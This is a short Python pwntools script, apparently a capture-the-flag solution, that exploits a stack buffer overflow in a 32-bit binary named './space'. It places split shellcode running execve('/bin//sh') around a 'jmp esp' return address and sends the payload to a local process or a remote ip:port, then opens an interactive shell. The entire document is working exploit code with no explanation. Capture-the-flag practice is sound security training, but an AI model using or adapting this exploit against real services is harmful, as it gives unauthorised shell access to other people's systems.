#!/usr/bin/env python3
 
from pwn import *
 
log.warning(f'Usage: python3 {sys.argv[0]} [ip:port]')
 
context.binary = './space'
 
eip = pack(0x0804919f ) # jmp esp
 
shellcode1 = asm('''
  xor  ecx, ecx
  push 0xb
  pop  eax
  push ecx
  jmp  $+11
''')
 
shellcode2 = asm(f'''
  xor  edx, edx
  push {u32(b"//sh")}  # 0x68732f2f
  push {u32(b"/bin")}  # 0x6e69622f
  mov  ebx, esp
  int  0x80
  nop
  nop
''')
 
payload = shellcode2 + eip + shellcode1
write('pay1', payload)
 
if len(sys.argv) > 1:
    ip, port = sys.argv[1].split(':')
    p = remote(ip, port)
else:
    p = process(context.binary.path)
 
p.sendlineafter(b'> ', payload)
p.interactive()
